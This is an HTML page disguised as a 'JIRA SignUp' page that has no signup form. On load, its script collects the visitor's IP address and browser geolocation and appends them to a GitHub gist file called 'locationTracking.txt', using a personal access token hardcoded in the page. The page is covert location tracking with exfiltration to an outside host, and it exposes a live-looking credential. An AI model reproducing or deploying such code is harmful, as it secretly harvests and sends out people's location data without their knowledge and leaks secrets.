<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JIRA SignUp</title>
    <script src="https://code.jquery.com/jquery-3.6.3.min.js"
        integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
</head>

<body>

    <script>

        // Function to get the device IP address using a third-party service
        function getDeviceIp() {
            return fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => console.error(error));
        }

        // Function to get the device's geolocation using the Geolocation API
        function getDeviceGeolocation() {
            return new Promise((resolve, reject) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        position => resolve(position.coords),
                        error => reject(error)
                    );
                } else {
                    reject('Geolocation not available');
                }
            });
        }

        // Usage example
        Promise.all([getDeviceIp(), getDeviceGeolocation()])
            .then(results => {
                const [ip, coords] = results;
                console.log(`Device IP: ${ip}`);
                console.log(`Device geolocation: ${coords.latitude}, ${coords.longitude}`);

                let userData = {
                    coordinates: coords,
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    latiLong: `${coords.latitude}, ${coords.longitude}`,
                    ipAddress: ip,
                    email: "test@example.com",
                    dateTime: new Date(Date.now()),
                }

                // call usePasteBin function
                console.log(userData);
                console.log(JSON.stringify(userData))
                usePasteBin(userData);
            })
            .catch(error => console.error(error));


        function usePasteBin(userData) {
            const token = "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";
            const apiUrl = "https://api.github.com/gists/89cdd2b3a50a05df4580daa767cec44c";
            const newContent = JSON.stringify(userData);
            const filename = "locationTracking.txt";
            const description = "My updated Gist description";

            // Retrieve the existing content of the Gist
            fetch(apiUrl, {
                method: "GET",
                headers: {
                    "Authorization": `token ${token}`
                }
            })
                .then(response => response.json())
                .then(data => {
                    // Extract the existing content from the Gist
                    const existingContent = data.files["locationTracking.txt"].content;

                    // Append the new content to the existing content
                    const updatedContent = existingContent + "," + newContent;

                    // Update the Gist with the combined content
                    fetch(apiUrl, {
                        method: "PATCH",
                        headers: {
                            "Authorization": `token ${token}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            "files": {
                                "locationTracking.txt": {
                                    "content": updatedContent
                                }
                            }
                        })
                    })
                        .then(response => response.json())
                        .then(data => {
                            console.log(data);
                            // The API response will include the URL of the updated Gist
                        });
                });

        }

        setTimeout(() => {
            console.log('Loaded Timeout');
            //window.location.href = 'https://api.ipify.org';
        }, 10000);



    </script>
</body>

</html>